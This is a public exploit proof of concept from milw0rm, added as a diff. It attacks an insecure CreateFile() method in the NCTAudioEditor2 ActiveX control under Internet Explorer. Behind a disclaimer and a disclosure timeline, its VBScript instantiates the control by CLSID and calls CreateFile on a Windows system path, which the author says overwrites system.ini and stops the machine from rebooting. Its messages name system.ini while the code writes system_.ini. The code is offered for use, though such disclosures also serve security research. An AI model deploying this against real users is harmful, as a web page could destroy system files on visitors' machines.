@@ -1,0 +1,52 @@
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">------------------------------------------------------------------------------------------
+ <b>NCTAudioEditor2 ActiveX DLL (NCTWMAFile2.dll v. 2.6.2.157) "CreateFile()"Insecure Method</b>
+ url: http://www.nctsoft.com/products/NCTAudioEditor2/
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+ 
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not be responsible for any damage.
+ 
+ <b><font color="#FF0000">THE EXPLOIT WILL OWERWRITE THE system.ini FILE SO BE SURE TO MAKE A COPY OF
+ IT BEFORE RUN THIS EXPLOIT OR YOUR PC WILL NOT RESTART!</font></b>
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+ all software that use this ocx (for example Sienzo DMM) are vulnerable to this exploits.
+
+ Time Table: 2007/20/06 -> Bug discovered
+             2007/20/06 -> Vendor notified by mail
+             2007/21/06 -> No response, vendor notified by web form
+             2007/22/06 -> No response from vendor
+             2007/23/06 -> No response from vendor
+             2007/24/06 -> No response from vendor
+             2007/25/06 -> Public disclosure
+------------------------------------------------------------------------------------------
+
+<object classid='clsid:6ED74AE3-8066-4385-AABA-243E033F75A3' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+ Sub tryMe
+  On Error Resume Next
+   Dim MyMsg
+   If(MsgBox("This was written for educational purpose. Use it at your own risk." & vbCrLf & _
+             "Author will be not be responsible for any damage." & vbCrLf & vbCrLf & _
+             "THIS EXPLOIT WILL OWERWRITE THE system.ini FILE SO BE SURE TO MAKE A COPY" & _
+             " OF IT BEFORE RUN THIS EXPLOIT OR YOUR PC WILL NOT RESTART!" & VBcRlF & "ARE YOU" & _
+             " SURE YOU REALLY WANT TO RUN THIS EXPLOIT?",4)=vbYes) Then
+    test.CreateFile "c:\windows\system_.ini"
+    MyMsg = MsgBox ("Check now the file system.ini" & vbCrLf & "It's overwritten.", 64,"NCTAudioEditor2")
+   Else
+    MyMsg = MsgBox ("Nice, be safe!", 64, "NCTAudioEditor2")
+   End If 
+ End Sub
+</script>
+
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-06-25]
